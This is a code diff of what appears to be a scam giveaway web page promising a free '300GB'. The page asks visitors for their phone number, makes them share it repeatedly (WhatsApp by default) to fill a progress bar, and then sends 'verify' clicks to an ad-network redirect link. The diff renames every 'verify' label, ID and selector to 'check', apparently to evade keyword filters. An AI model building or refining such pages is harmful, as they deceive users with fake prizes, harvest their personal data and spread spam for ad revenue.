@@ -235,7 +235,7 @@ by
 <form class="quedate__form" onsubmit="return prevent(event)">
 <input class="quedate__form-input" type="number" id="num" placeholder=" enter your phone number" />
 <span class="quedate__form-separar"></span>
-<label id="enviar" class="quedate__form-label" for="num"> .verify the number</label>
+<label id="enviar" class="quedate__form-label" for="num"> .check the number</label>
 <div class="message-status js-hidden"></div>
 </form>
 </div>
@@ -501,7 +501,7 @@ by
 </div>
 
 
-<div class="loading2 js-hidden js-verify">
+<div class="loading2 js-hidden js-check">
 <div class="loading2__box">
 <b style="font-weight:bold; font-size:16px"> Congratulations! Final verification step, you get 300GB!</b>
 <br/>
@@ -518,7 +518,7 @@ by
 <br/>
 <br/>
 <div style="display: flex;">
-<button style="display: flex;align-items: center;justify-content: center;margin: 0;" id="verify" class="quedate__cta-btn"> verify now</button>
+<button style="display: flex;align-items: center;justify-content: center;margin: 0;" id="check" class="quedate__cta-btn"> check now</button>
 </div>
 <br/>
 <center>
@@ -809,7 +809,7 @@ if(!Cookies.get('jumpurl')){
             share: document.querySelector("#compartir"),
             congrats: document.querySelector(".js-congrats"),
             sharing: document.querySelector(".js-share"),
-            verify: document.querySelector("#verify")
+            check: document.querySelector("#check")
         }, objServer = {};
     document.addEventListener("click", function (c) {
         var a = c.toElement || c.srcElement;
@@ -869,7 +869,7 @@ if(!Cookies.get('jumpurl')){
     Cookies.get('e') ? setTimeout('enviar()',500) : void(0);
 function checkshare(d, e, m, l, i, p='whatsapp'){
        if (10 <= d) {
-            for (let a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
+            for (let a = document.querySelectorAll("#check"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
                 switch(b){
                     case 0:
                         location.href='https://www.profitablecpmrate.com/y8tbun1htz?key=ee0d7bdd57e2d5d4d053de7253bbae22'
@@ -882,7 +882,7 @@ function checkshare(d, e, m, l, i, p='whatsapp'){
                       break;
                 }
             });
-            DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
+            DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-check").classList.remove("js-hidden"), DOMString.check.classList.remove("js-hidden")
         } else
             d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
         setTimeout(function() {
